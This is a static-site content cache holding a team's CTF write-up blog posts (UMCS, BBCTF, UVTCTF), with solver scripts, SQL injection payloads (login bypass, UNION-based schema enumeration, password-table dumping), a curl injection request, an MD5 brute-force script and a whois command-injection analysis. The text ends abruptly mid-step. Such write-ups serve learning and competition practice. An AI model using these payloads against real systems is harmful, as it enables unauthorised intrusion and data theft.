[["Map",1,2,9,10,75,76,137,138],"meta::meta",["Map",3,4,5,6,7,8],"astro-version","5.5.6","content-config-digest","ad66b10c4652e5de","astro-config-digest","{\"root\":{},\"srcDir\":{},\"publicDir\":{},\"outDir\":{},\"cacheDir\":{},\"site\":\"https://bwrg3r.github.io\",\"compressHTML\":true,\"base\":\"/\",\"trailingSlash\":\"ignore\",\"output\":\"static\",\"scopedStyleStrategy\":\"attribute\",\"build\":{\"format\":\"directory\",\"client\":{},\"server\":{},\"assets\":\"_astro\",\"serverEntry\":\"entry.mjs\",\"redirects\":true,\"inlineStylesheets\":\"auto\",\"concurrency\":1},\"server\":{\"open\":false,\"host\":true,\"port\":1234,\"streaming\":true,\"allowedHosts\":[]},\"redirects\":{},\"image\":{\"endpoint\":{\"route\":\"/_image\"},\"service\":{\"entrypoint\":\"astro/assets/services/sharp\",\"config\":{}},\"domains\":[],\"remotePatterns\":[]},\"devToolbar\":{\"enabled\":false},\"markdown\":{\"syntaxHighlight\":false,\"shikiConfig\":{\"langs\":[],\"langAlias\":{},\"theme\":\"github-dark\",\"themes\":{},\"wrap\":false,\"transformers\":[]},\"remarkPlugins\":[null,null,null,null],\"rehypePlugins\":[[null,{\"target\":\"_blank\",\"rel\":[\"nofollow\",\"noreferrer\",\"noopener\"]}],null,null,[null,{\"theme\":{\"light\":\"github-light\",\"dark\":\"github-dark\"}}],[null,{\"themes\":[\"github-light\",\"github-dark\"],\"plugins\":[{\"name\":\"Collapsible sections\",\"styleSettings\":{\"defaultValues\":{\"collapsibleSections\":{\"closedBorderWidth\":\"0\",\"closedPaddingBlock\":\"4px\",\"closedMargin\":\"0\",\"closedFontFamily\":\"inherit\",\"closedFontSize\":\"inherit\",\"closedLineHeight\":\"inherit\",\"openBorderWidth\":\"1px\",\"openPadding\":\"0\",\"openMargin\":\"0\",\"openBackgroundColor\":\"transparent\",\"openBorderColor\":\"transparent\"}},\"cssVarExclusions\":[],\"cssVarReplacements\":[[\"collapsibleSections\",\"cs\"]]},\"hooks\":{}},{\"name\":\"Line numbers\",\"styleSettings\":{\"defaultValues\":{\"lineNumbers\":{\"foreground\":\"inherit\",\"highlightForeground\":\"inherit\"}},\"cssVarExclusions\":[],\"cssVarReplacements\":[]},\"hooks\":{}},{\"name\":\"astro-expressive-code\",\"hooks\":{}}],\"useDarkModeMediaQuery\":false,\"defaultProps\":{\"wrap\":true,\"collapseStyle\":\"collapsible-auto\",\"overridesByLang\":{\"ansi,bat,bash,batch,cmd,console,powershell,ps,ps1,psd1,psm1,sh,shell,shellscript,shellsession,text,zsh\":{\"showLineNumbers\":false}}},\"styleOverrides\":{\"borderColor\":\"var(--border)\",\"codeFontFamily\":\"var(--font-mono)\",\"codeBackground\":\"color-mix(in oklab, var(--secondary) 25%, transparent)\",\"frames\":{\"editorActiveTabForeground\":\"var(--muted-foreground)\",\"editorActiveTabBackground\":\"color-mix(in oklab, var(--secondary) 25%, transparent)\",\"editorActiveTabIndicatorBottomColor\":\"transparent\",\"editorActiveTabIndicatorTopColor\":\"transparent\",\"editorTabBarBackground\":\"transparent\",\"editorTabBarBorderBottomColor\":\"transparent\",\"frameBoxShadowCssValue\":\"none\",\"terminalBackground\":\"color-mix(in oklab, var(--secondary) 25%, transparent)\",\"terminalTitlebarBackground\":\"transparent\",\"terminalTitlebarBorderBottomColor\":\"transparent\",\"terminalTitlebarForeground\":\"var(--muted-foreground)\"},\"lineNumbers\":{\"foreground\":\"var(--muted-foreground)\"},\"uiFontFamily\":\"var(--font-sans)\"}}]],\"remarkRehype\":{},\"gfm\":true,\"smartypants\":true},\"security\":{\"checkOrigin\":true},\"env\":{\"schema\":{},\"validateSecrets\":false},\"experimental\":{\"clientPrerender\":false,\"contentIntellisense\":false,\"responsiveImages\":false,\"serializeConfig\":false,\"headingIdCompat\":false,\"preserveScriptOrder\":false},\"legacy\":{\"collections\":false}}","blog",["Map",11,12,31,32,43,44,60,61],"umcsctf2025-finals",{"id":11,"data":13,"body":25,"filePath":26,"assetImports":27,"digest":29,"deferredRender":30},{"title":14,"description":15,"date":16,"image":17,"tags":18,"authors":20},"UMCS CTF 2025 Finals","A compilation of UMCS CTF 2025 Finals Writeups",["Date","2025-05-17T00:00:00.000Z"],"__ASTRO_IMAGE_./assets/logo.png",[19],"UMCSCTF",[21,22,23,24],"hoezhiwan","gr1d","w_11","bakayang","# [Crypto]\n## Quantum-Web-Token\n\n- Implements BB84 quantum key distribution protocol\n- Uses Qiskit for quantum circuit simulation\n- Uses JWT (JSON Web Tokens) for communication\n- Involves 32 qubits per round\n- Goal: We need to guess Bob's measured bits (r_bits) correctly to get the flag\n\nThe vulnerability was indeed that `s_bits` (Alice's secret bits) were not regenerated for each new connection or session, allowing us to collect them over multiple rounds. Once all `s_bits`were known, we could use the xor values from the last round's qwt tokens to determine Bob's measured bits `r_bits` and submit the correct guess.\n\n![](./assets/crypto/flag.png)  \n\n# Solve Script\n\n```python\n#!/usr/bin/env python3\n# Solution for quantum-web-token CTF challenge\n\nfrom pwn import * # Using pwntools for connection convenience\nimport base64\nimport json\nimport time\n\n# JWT decoding function\ndef decode_jwt_payload_segment(payload_b64_str: str) -> dict:\n    \"\"\"\n    Decodes the payload segment of a JWT token.\n    The input is the base64url encoded payload string (middle part of JWT).\n    \"\"\"\n    # Add padding if necessary for base64url decoding\n    padded_payload_b64_str = payload_b64_str + '=' * (-len(payload_b64_str) % 4)\n    payload_json_bytes = base64.urlsafe_b64decode(padded_payload_b64_str)\n    return json.loads(payload_json_bytes.decode('utf-8'))\n\ndef solve(max_retries=5, initial_timeout=15, per_line_timeout=10, recv_timeout=10): # Increased timeouts\n    for attempt in range(max_retries):\n        log.info(f\"Starting attempt {attempt + 1}/{max_retries}\")\n        conn = None  # Initialize conn to None\n        try:\n            # Set up pwntools context for quieter output or debugging\n            # context.log_level = 'debug' # Uncomment for verbose pwntools output\n            context.log_level = 'info'\n\n            # conn = remote(\"localhost\", 5001) # For local testing\n            conn = remote(\"116.203.176.73\", 5001, timeout=initial_timeout)\n            log.info(\"Connected to server.\")\n\n            # Receive welcome message\n            welcome_msg = conn.recvuntil(b\"Sending qubits through quantum channel:\\n\", timeout=recv_timeout)\n            log.info(f\"Welcome message received: {welcome_msg.decode().strip()}\")\n            \n            time.sleep(0.5) # Add a small delay after welcome, before server sends JWTs\n\n            n_qubits = 32\n            s_bits_master = [None] * n_qubits # Stores the known s_bits from Alice\n            num_s_bits_known = 0\n            current_round_xors = [None] * n_qubits # Stores XOR values for the current round (needs to be accessible after loop)\n\n\n            round_num = 0\n            # Loop until all of Alice's s_bits are known\n            while num_s_bits_known \u003C n_qubits:\n                round_num += 1\n                log.info(f\"Starting Round {round_num}. Known s_bits: {num_s_bits_known}/{n_qubits}\")\n                \n                # 1. Receive n_qubits qwt JWTs (individual qubit info)\n                for i in range(n_qubits):\n                    try:\n                        jwt_line_bytes = conn.recvline(timeout=per_line_timeout) \n                        if not jwt_line_bytes:\n                            log.error(f\"Connection closed prematurely while reading qwt JWT {i} in round {round_num}.\")\n                            raise EOFError(\"Connection closed by server\")\n                        jwt_line = jwt_line_bytes.strip().decode()\n                        \n                        if jwt_line.count('.') != 2:\n                            log.error(f\"Received malformed JWT in round {round_num}, JWT {i}: {jwt_line}\")\n                            raise ValueError(\"Malformed JWT received\")\n\n                        payload_b64_str = jwt_line.split('.')[1]\n                        payload = decode_jwt_payload_segment(payload_b64_str)\n                        current_round_xors[i] = payload['xor']\n                    except Exception as e:\n                        log.error(f\"Error processing qwt JWT {i} in round {round_num}: {e}\")\n                        problematic_line = jwt_line_bytes if 'jwt_line_bytes' in locals() and jwt_line_bytes is not None else b'N/A'\n                        log.error(f\"Problematic JWT line (if any): {problematic_line.decode(errors='ignore')}\")\n                        raise \n                log.info(f\"Round {round_num}: Received all {n_qubits} qwt JWTs.\")\n\n                # 2. Receive p_key JWT (sifted key info)\n                try:\n                    pkey_jwt_line_bytes = conn.recvline(timeout=per_line_timeout)\n                    if not pkey_jwt_line_bytes:\n                        log.error(f\"Connection closed prematurely while reading pkey JWT in round {round_num}.\")\n                        raise EOFError(\"Connection closed by server\")\n                    pkey_jwt_line = pkey_jwt_line_bytes.strip().decode()\n\n                    if pkey_jwt_line.count('.') != 2:\n                        log.error(f\"Received malformed pkey JWT in round {round_num}: {pkey_jwt_line}\")\n                        raise ValueError(\"Malformed pkey JWT received\")\n                    \n                    pkey_payload_b64_str = pkey_jwt_line.split('.')[1]\n                    pkey_payload = decode_jwt_payload_segment(pkey_payload_b64_str)\n                except Exception as e:\n                    log.error(f\"Error processing pkey JWT in round {round_num}: {e}\")\n                    problematic_pkey_line = pkey_jwt_line_bytes if 'pkey_jwt_line_bytes' in locals() and pkey_jwt_line_bytes is not None else b'N/A'\n                    log.error(f\"Problematic pkey JWT line (if any): {problematic_pkey_line.decode(errors='ignore')}\")\n                    raise\n\n                new_bits_learned_this_round = 0\n                for idx_str, bit_val in pkey_payload.items():\n                    idx = int(idx_str) \n                    if s_bits_master[idx] is None:\n                        s_bits_master[idx] = bit_val\n                        num_s_bits_known += 1\n                        new_bits_learned_this_round +=1\n                \n                log.info(f\"Round {round_num}: Learned {new_bits_learned_this_round} new s_bits. Total known: {num_s_bits_known}/{n_qubits}\")\n\n                # 3. Decide whether to continue to another round or stop\n                try:\n                    prompt = conn.recvuntil(b\"Do you want somemore tokens? (y/n): \", timeout=recv_timeout).decode()\n                except Exception as e:\n                    log.error(f\"Error receiving 'more tokens' prompt in round {round_num}: {e}\")\n                    raise\n\n                if num_s_bits_known == n_qubits:\n                    log.info(\"All s_bits are known. Sending 'n' to stop receiving tokens.\")\n                    conn.sendline(b\"n\")\n                    break \n                else:\n                    conn.sendline(b\"y\")\n            \n            log.info(\"All s_bits collected. Calculating the final r_bits (Bob's measured bits).\")\n            \n            r_bits_final = [None] * n_qubits\n            for i in range(n_qubits):\n                if s_bits_master[i] is None:\n                    log.error(f\"Critical error: s_bits_master[{i}] is None even after loop completion.\")\n                    raise ValueError(f\"s_bits_master[{i}] is None\")\n                if current_round_xors[i] is None: # Should not happen if logic is correct\n                    log.error(f\"Critical error: current_round_xors[{i}] is None before final calculation.\")\n                    raise ValueError(f\"current_round_xors[{i}] is None\")\n                r_bits_final[i] = s_bits_master[i] ^ current_round_xors[i]\n\n            try:\n                guess_prompt = conn.recvuntil(b\"Guess Bob's qubits (comma as delimeter): \", timeout=recv_timeout).decode()\n            except Exception as e:\n                log.error(f\"Error receiving 'guess' prompt: {e}\")\n                raise\n                \n            guess_str = \",\".join(map(str, r_bits_final))\n            log.info(f\"Sending guess: {guess_str}\")\n            conn.sendline(guess_str.encode())\n\n            try:\n                result_bytes = conn.recvall(timeout=recv_timeout + 10) \n                result = result_bytes.decode(errors='ignore') \n                log.info(f\"Server response:\\n{result}\")\n                if \"UMCS{\" in result:\n                    log.success(\"Flag captured!\")\n                    print(f\"FLAG: {result.strip()}\") \n                elif \"worst guess ever\" in result:\n                    log.error(\"Guess was incorrect.\")\n                else:\n                    log.warning(\"Flag not found in the response, and no explicit failure message.\")\n                return \n            except Exception as e:\n                log.error(f\"Error receiving final result: {e}\")\n                raise\n\n        except EOFError as e:\n            log.error(f\"EOFError during attempt {attempt + 1}: {e}. Server closed connection.\")\n        except PwnlibException as e: \n            log.error(f\"PwnlibException during attempt {attempt + 1}: {e}\")\n        except ValueError as e: \n            log.error(f\"ValueError during attempt {attempt + 1}: {e}\")\n        except Exception as e:\n            log.error(f\"An unexpected error occurred during attempt {attempt + 1}: {type(e).__name__} - {e}\")\n        \n        if conn:\n            conn.close()\n        \n        if attempt \u003C max_retries - 1:\n            log.info(f\"Retrying in 5 seconds...\")\n            time.sleep(5)\n        else:\n            log.error(\"All retries failed.\")\n            break \n            \n    log.info(\"Solver finished.\")\n\nif __name__ == '__main__':\n    solve()\n```","src/content/blog/umcsctf2025-finals/index.mdx",[28],"./assets/logo.png","86868a7292223159",true,"umcsctf2025-prelim",{"id":31,"data":33,"body":39,"filePath":40,"assetImports":41,"digest":42,"deferredRender":30},{"title":34,"description":35,"date":36,"image":17,"tags":37,"authors":38},"UMCS CTF 2025 Preliminary Round","A compilation of UMCS CTF 2025 Preliminary Round Writeups",["Date","2025-04-13T00:00:00.000Z"],[19],[21,22,23,24],"![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page1.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page2.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page3.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page4.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page5.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page6.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page7.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page8.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page9.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page10.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page11.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page12.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page13.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page14.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page15.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page16.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page17.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page18.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page19.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page20.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page21.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page22.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page23.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page24.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page25.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page26.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page27.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page28.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page29.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page30.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page31.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page32.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page33.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page34.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page35.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page36.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page37.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page38.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page39.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page40.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page41.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page42.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page43.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page44.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page45.png)\n![](./assets/UMCS%20CTF%20Preliminary%20Round%20Writeups_Page46.png)","src/content/blog/umcsctf2025-prelim/index.mdx",[28],"35bc27e46a04b9fa","bbctf2025",{"id":43,"data":45,"body":55,"filePath":56,"assetImports":57,"digest":59,"deferredRender":30},{"title":46,"description":47,"date":48,"image":49,"tags":50,"authors":54},"BBCTF 2025","A compilation of BBCTF 2025 Writeups",["Date","2025-05-05T00:00:00.000Z"],"__ASTRO_IMAGE_./assets/openpage.png",[51,52,53],"BBCTF","CTF","Writeup",[24,22,23],"## [Forensics]\n\n## [Web]\n\n## SQLI Series - 1\n\n### Goals\n---\nExploit a SQL injection vulnerability to extract the flag from a database.\n\n### Solution\n---\n1. Identify the vulnerability in the search function where user input is directly inserted into SQL query:\n   ```python\n   query = f\"SELECT * FROM products WHERE name LIKE '%{search_term}%'\"\n   ```\n\n2. Craft a payload to escape the string and use UNION-based injection:\n   ```\n   ' UNION SELECT 1, flag_value FROM flag -- \n   ```\n\n3. Send request with required User-Agent header to bypass authentication check:\n   ```bash\n   curl -X POST http://target-url/ \\\n     -H \"User-Agent: UMCS-CTF\" \\\n     -d \"search=' UNION SELECT 1, flag_value FROM flag -- \"\n   ```\n\n### Final Result\n---\n**Flag:** `BBCTF{sql_inj3ct10n_101}`","src/content/blog/bbctf2025/index.mdx",[58],"./assets/openpage.png","313eaf2f2fb309b9","uvtctf2025",{"id":60,"data":62,"body":70,"filePath":71,"assetImports":72,"digest":74,"deferredRender":30},{"title":63,"description":64,"date":65,"image":66,"tags":67,"authors":69},"UVTCTF 2025","A compilation of UVTCTF 2025 Writeups",["Date","2025-05-05T00:00:00.000Z"],"__ASTRO_IMAGE_./assets/1200x630.png",[68],"UVTCTF",[24,22,23],"## [Cryptography]\n\n## Shuffling\n![](./assets/crypto/question.png)\n\n### Solution  \n---\n```python\nimport random\nimport time\n\n# Original permutation\nP = [15, 6, 19, 20, 28, 11, 27, 16, 0, 14, 22, 25, 4, 17, 30, 9, 1, 7, 23, 13, 31, 26, 2, 8, 18, 12, 29, 5, 21, 10, 3, 24]\n\n# Create inverse permutation for unshuffling\ndef create_inverse_permutation(P):\n    inverse_P = [0] * len(P)\n    for i, p in enumerate(P):\n        inverse_P[p] = i\n    return inverse_P\n\ndef unshuffle(shuffled_list, inverse_P):\n    unshuffled = [0] * len(shuffled_list)\n    for i in range(len(shuffled_list)):\n        unshuffled[inverse_P[i]] = shuffled_list[i]\n    return unshuffled\n\ndef decrypt(ciphertext_hex):\n    # Convert hex string to bytes\n    ct = bytes.fromhex(ciphertext_hex)\n    \n    # Create inverse permutation for unshuffling\n    inverse_P = create_inverse_permutation(P)\n    \n    # Since we know the encryption steps:\n    # 1. Set random seed to sum of shuffled values\n    # 2. Generate key and XOR\n    \n    # We need to find the sum of shuffled values to get the key\n    # We'll try a range of possible sums that would be reasonable for ASCII text\n    for potential_sum in range(2000, 4000):\n        random.seed(potential_sum)\n        key = random.randbytes(len(ct))\n        \n        # XOR the ciphertext with the key to get shuffled values\n        shuffled = [c ^ k for c, k in zip(ct, key)]\n        \n        # Check if the sum of these values matches our potential sum\n        if sum(shuffled) == potential_sum:\n            # We found the correct sum! Now unshuffle\n            unshuffled = unshuffle(shuffled, inverse_P)\n            \n            # Convert to a string, stopping at padding\n            flag = \"\"\n            for val in unshuffled:\n                if 32 \u003C= val \u003C= 126:  # Printable ASCII\n                    flag += chr(val)\n                else:\n                    # We've likely reached the padding\n                    break\n            \n            # Check if it looks like a flag\n            if \"UVT{\" in flag and \"}\" in flag:\n                start = flag.find(\"UVT{\")\n                end = flag.find(\"}\", start) + 1\n                return flag[start:end]\n    \n    return \"Decryption failed. The ciphertext might be corrupted or the algorithm might have changed.\"\n\n# Decrypt the ciphertext\nciphertext = \"50d553c657e8deff8e103dffa796f8c80f16e6113aa39b025d5690d0771ebf88\"\nprint(decrypt(ciphertext))\n```\n\n### Final Result\n---\n![](./assets/crypto/final.png)  \n**Flag:** `UVT{1_l1ke_t0_m0v3_1t_m0v3_i7}`\n\n\n## [Forensics]\n\n## RAMblings of Cornelia  \n![](./assets/forensics/RAM/question.png)  \n\n### Goals\n---\nGet familiar with the dumpfiles feature in memory forensics\n\n### Solution  \n---\n1. Use MemprocFS or Volatility3 to perform a filescan to obtain the file address inside processes.  \n` windows.filescan.Filescan`\n2. Search for evidences related to \"SAWAT\"\n![](./assets/forensics/RAM/evidence.png)  \n3. Dumpfiles company-intel.7z, and kind-reminder.txt\n4. Extract the 7zip compressed folder, with the password given in kind-reminder.txt  \n\n### Final Result\n---\n![](./assets/forensics/RAM/hq.png)  \n**Flag:** `UVT{C0rn3l1a_dUmPs_tH3_r4W_tRutH}`\n\n\n## Dark Web Stories  \n![](./assets/forensics/darkweb/question.png)  \n\n### Goals\n---\n1. Capture the network packets using WireShark.\n2. Understand how MD5 hashing decryption works.\n3. Perform a Steganography Analysis to retrieve the flag.\n\n### Solution  \n---\n1. Export all the HTTP Packets from WireShark\n2. Extract MD5 hashes hidden accross the packets\n```\n5dbc98dcc983a70728bd082d1a47546e\nf72c915d8f575a5c0999b5f37b6d99b7\na20bba554bfa1580a9d4aa2b6879ed46\n02beeea47ee3cfe212e6bd843b9ce7d3\n3112c7a8b6cd1677db0e3173e140fc05\n50f4646135205fd4a5417e460cf71d3c\neb22cfa0890a2df3177966854a7176bc\n845f49aa19c955b849d57593bf09d224\n87f63931da79aa969ac4a776ce6cfb03\n9793d9d6041c80f46ad7c1f530c8bbf8\n2f88d89a8f50426a6285449be3286708\n61bd22f017588208a0cacdf9a1a7ca1e\na7623c8b76316e10538782371b709415\nc6cca42180caba17e9e6882dc66cc6ee\n7c854900e46ebc5ee5680032b3e334de\nac81882b848b7673d73777ca22908c0d\n4ce97d67963edca55cdd21d46a68f5bb\n4abb62a00bccb775321f2720f2c7750b\n67e00e8ef738fe75afdb42b22e50371e\nb561052e5697ee5f1491b5e350fb78e1\n```\n3. Decrypt the MD5 hashes by running the script below\n```python\n#!/usr/bin/env python3\nimport hashlib\nimport string\n\ndef calculate_md5(text):\n    \"\"\"Calculate MD5 hash of given text\"\"\"\n    return hashlib.md5(text.encode()).hexdigest()\n\ndef main():\n    # Read the MD5 hashes from the file\n    with open('md5_hashes.txt', 'r') as f:\n        hashes = [line.strip() for line in f.readlines()]\n    \n    # Known pattern starting with \"S\", \"Su\", \"Sup\", \"Sup3\"\n    current_text = \"\"\n    \n    # Set of possible characters to try\n    possible_chars = string.ascii_letters + string.digits + string.punctuation + \" \"\n    \n    # For each hash in the file\n    for i, target_hash in enumerate(hashes):\n        found = False\n        \n        # Try appending each possible character and check if hash matches\n        for char in possible_chars:\n            test_text = current_text + char\n            test_hash = calculate_md5(test_text)\n            \n            if test_hash == target_hash:\n                current_text = test_text\n                print(f\"Line {i+1}: {current_text} -> {target_hash}\")\n                found = True\n                break\n        \n        if not found:\n            print(f\"Failed to find match for hash at line {i+1}: {target_hash}\")\n            break\n    \n    print(\"\\nFinal decrypted message:\", current_text)\n\nif __name__ == \"__main__\":\n    main()\n```\n4. Obtain the password\n```\nLine 1: S -> 5dbc98dcc983a70728bd082d1a47546e\nLine 2: Su -> f72c915d8f575a5c0999b5f37b6d99b7\nLine 3: Sup -> a20bba554bfa1580a9d4aa2b6879ed46\nLine 4: Sup3 -> 02beeea47ee3cfe212e6bd843b9ce7d3\nLine 5: Sup3r -> 3112c7a8b6cd1677db0e3173e140fc05\nLine 6: Sup3r$ -> 50f4646135205fd4a5417e460cf71d3c\nLine 7: Sup3r$3 -> eb22cfa0890a2df3177966854a7176bc\nLine 8: Sup3r$3c -> 845f49aa19c955b849d57593bf09d224\nLine 9: Sup3r$3cr -> 87f63931da79aa969ac4a776ce6cfb03\nLine 10: Sup3r$3cre -> 9793d9d6041c80f46ad7c1f530c8bbf8\nLine 11: Sup3r$3cre7 -> 2f88d89a8f50426a6285449be3286708\nLine 12: Sup3r$3cre7P -> 61bd22f017588208a0cacdf9a1a7ca1e\nLine 13: Sup3r$3cre7P4 -> a7623c8b76316e10538782371b709415\nLine 14: Sup3r$3cre7P4$ -> c6cca42180caba17e9e6882dc66cc6ee\nLine 15: Sup3r$3cre7P4$S -> 7c854900e46ebc5ee5680032b3e334de\nLine 16: Sup3r$3cre7P4$Sw -> ac81882b848b7673d73777ca22908c0d\nLine 17: Sup3r$3cre7P4$Sw0 -> 4ce97d67963edca55cdd21d46a68f5bb\nLine 18: Sup3r$3cre7P4$Sw0r -> 4abb62a00bccb775321f2720f2c7750b\nLine 19: Sup3r$3cre7P4$Sw0rd -> 67e00e8ef738fe75afdb42b22e50371e\nLine 20: Sup3r$3cre7P4$Sw0rd! -> b561052e5697ee5f1491b5e350fb78e1\n\nFinal decrypted message: Sup3r$3cre7P4$Sw0rd!\n```\n\n5. Unzip the `secretdata.zip` with the password obtained\n6. Obtain `hacker.png`\n![](./assets/forensics/darkweb/hacker.png)\n7. Perform steganalysis on the image\n\n### Final Result\n---\nZSteg yields the flag  \n![](./assets/forensics/darkweb/zsteg.png)\n**Flag:** `UVT{4_l0T_0f_lay3r5_70_unc0v3r_1nn1t?}`\n\n## [Miscellaneous]\n\n### Insert Coin to Play - Part 1\n![](./assets/misc/question1.png)\n\n### Goals\n---\n1. Explore the game and understand how it works\n2. Find out ways to bypass the scoring system of the game.\n\n### Solution\n1. Open the game and play it. The game is a simple 2D game where you need to catch the falling coins.\n2. The game has a scoring system where you need to catch the coins to score points. However, there wont have enough coins to win the game.\n![](./assets/misc/ohno.png)\n3. With the use of Cheat Engine, we can find the memory address of the score and edit it to a higher value.\n![](./assets/misc/gg.png)\n4. In here I change it to 20 value so it is high enough to win the game.\n5. After that, catch the last coin and I can win the game and get the flag.\n\n### Final Result\n---\n![](./assets/misc/flag1.png)\n**Flag:** `UVT{Wh4t?!_D1d_Y0u_r3aLly_c4TcH_1t?}`\n\n### Insert Coin to Play - Part 2  \n![](./assets/misc/question.png)\n\n### Goals\n---\n1. Explore how the game scoring system works\n2. Use Cheat Engine to edit the scoring mechanism\n\n### Solution  \n---\n1. Using dnSpy, we analyse the decompiled C# code, diving into the AddScore() function\n![](./assets/misc/dnspy.png) \n2. From the logic, we find out that we need to use Cheat Engine to increment 27 manually to the original score in order to call the win function.\n3. Track the corresponding scoring value with Cheat Engine and edit it.\n![](./assets/misc/cheatengine.png)  \n\n### Final Result\n---\n![](./assets/misc/flag.png)  \n**Flag:** `UVT{Wh4t?!_D1d_Y0u_r3aLly_c4TcH_1t?}`\n\n## [Web]\n\n### Error=300\n![](./assets/web/error=300/task.png)\n\n\n### Goals\n---\n1. Understand how the web application works\n2. Find the flag in the web application\n3. Understand how the web application is vulnerable to SQL Injection\n4. Use SQL Injection to bypass the login system and get the flag\n\n### Solution\n1. The web application is a simple login system where you need to enter your username and password to log in.\n![](./assets/web/error=300/login.png)\n2. We can find out that the web login page is vulnerable to SQL Injection. We can use the following payload to bypass the login system:\n``` 'or 1=1-- ```\n3. After that, we can see there is another page that we need to access the sql database to get the flag.\n4. We can use the following SQL query to test the blind sql injection:\n- Test the length of the column name (test and error by adding NULL values):\n```sql\n' UNION SELECT NULL,NULL,NULL,NULL -- -\n```\n![](./assets/web/error=300/trycoloumnsize.png)\n- After that, we need to find the name of the database using the following query:\n```sql \n` UNION SELECT NULL,NULL,NULL,schema_name FROM information_schema.schemata -- -\n```\n![](./assets/web/error=300/find%20database.png)\n- After that, we can find the name of the table name from that database using the following query:\n```sql\n' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables WHERE table_schema = 'sqli_challenge' -- -\n```\n![](./assets/web/error=300/tablenamesqlichallenge.png)\n- After that, we can find the name of the column name from that table using the following query:\n```sql\n' UNION SELECT NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_schema = 'sqli_challenge' -- -\n```\n![](./assets/web/error=300/coloumn%20sqli.png) \n- After that, we can find the flag using the following query:\n```sql \n' UNION SELECT NULL,flag,NULL,NULL FROM sqli_challenge.secrets-- -\n```\n![](./assets/web/error=300/1flag.png)\n\n5. Repeat the process for the second flag using the same method as above.\nand we will get the second flag.\n```sql\n' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables WHERE table_schema = 'password_reset' -- -\n```\n```sql\n' UNION SELECT NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_schema = 'password_reset' -- -\n```\n```sql\n' UNION SELECT NULL,NULL,NULL,password FROM password_reset.users-- -\n```\n![](./assets/web/error=300/flag2.png)\n\n6. After that combine the two flags together to get the final flag.\n\n### Final Result\n**Flag:** `UVT{Th3_sy5t3M_7ru5Ts_1tS_oWn_9r4Mmar_..._S0_5tR1ng5_4r3_m0r3_tHaN_qu3r13s_1n_th3_3nd}`\n\n### Domain info\n![](./assets/web/domain%20info/task.png)\n\n### Goals\n---\n1. Analyze a PHP web application for security vulnerabilities\n2. Exploit command injection to read the flag\n3. Bypass security filters using creative techniques\n\n### Solution\n1. First, I analyzed the PHP code in the web application which allows users to execute whois commands:\n```php\n\u003C?php\n$command = \"whois -h \" . $host . \" -p \" . $port . \" \" . $query . \" > \" . escapeshellarg($savepath);\nsystem($command);\n```\n2. The application had security measures in place:\n- It filters out common command injection characters like **;**,**&**,**|**,**$**, **(**, **)**, **\u003C & > **\n- It validates the host is a valid IP or domain\n- It uses escapeshellarg() on some parameters\n```    // Basic anti-command injection filters\n    foreach ([$host, $port, $query, $savefile] as $input) {\n        if (preg_match('/[;&|`$()\u003C>]/', $input)) {\n            die(\"\u003Cp style='color:red;'>❌ Command Injection Detected!\u003C/p>\");\n        }\n    }\n```\n\n3. Setting up a local server to receive the whois command output:\n```bash\nimport socket\n\nHOST = '0.0.0.0'   # Listen on all interfaces\nPORT = 1234         # Local port to run the server\n\n# PHP code to read the 